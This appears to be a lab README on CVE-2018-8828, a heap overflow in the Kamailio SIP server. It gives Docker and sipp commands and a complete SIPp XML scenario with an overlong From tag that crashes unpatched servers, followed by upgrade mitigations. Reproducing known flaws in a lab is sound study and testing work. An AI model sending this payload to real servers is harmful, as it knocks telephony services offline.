# Memory Corruption
- Vulnerable component: Kamailio server
- Affected versions: 
    - before 4.4.7
    - for class 5.0.x before 5.0.6
    - for class 5.1.x before 5.1.2
- CVE ID: [CVE-2018-8828](https://nvd.nist.gov/vuln/detail/CVE-2018-8828)

## Description
In this scenario, due to a malformed request sent to the server, it crashes because of Memory Corruption: the data is written beyond the dynamically allocated memory.

## How to reproduce the issue
In this scenario, the first step is to start the containers:
```bash
docker compose up -d --build
```
If a REGISTER request contains a malformed or excessively long  ```branch``` parameter or ```From tag``` — fields that are not properly bounded in vulnerable versions — the call to ```tmx_check_pretran()``` will trigger an off-by-one heap-based buffer overflow, causing a segmentation fault and crashing the container.

### Exploit the vulnerability
Then, access the <i>sipp101</i> container:
```bash
docker exec -it sipp101 bash
```
The malformed message is sent using:
```bash
sipp -sf /sipp/xml/overflow.xml <IP_VM> -m 1
```
where:
- `-sf /sipp/xml/overflow.xml` indicates the XML file containing the malformed SIP Register request;
- `IP_VM` is the IP address of the VM hosting the containers (Kamailio container);
- `-m 1` specifies that only one message is sent.

The script used is:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE scenario SYSTEM "sipp.dtd">
<scenario name="overflow">
  <send>
    <![CDATA[
    REGISTER sip:[remote_ip]:[remote_port] SIP/2.0
    Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394
    To: <sip:1@[remote_ip]:[remote_port]>
    From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg
    Call-ID: 8b113457-c6a6-456a-be68-606686d93c38
    Contact: sip:1@127.0.0.1:53497
    Max-Forwards: 70
    CSeq: 10086 REGISTER
    User-Agent: go SIP fuzzer/1
    Content-Length: 0
    ]]>
  </send>
  
</scenario>
```

### Mitigations
- Update to patched version:
    - after 4.4.7;
    - for class 5.0.x after 5.0.6;
    - for class 5.1.x after 5.1.2.

## Credits
This vulnerability was discovered by [Enable Security](https://www.enablesecurity.com/).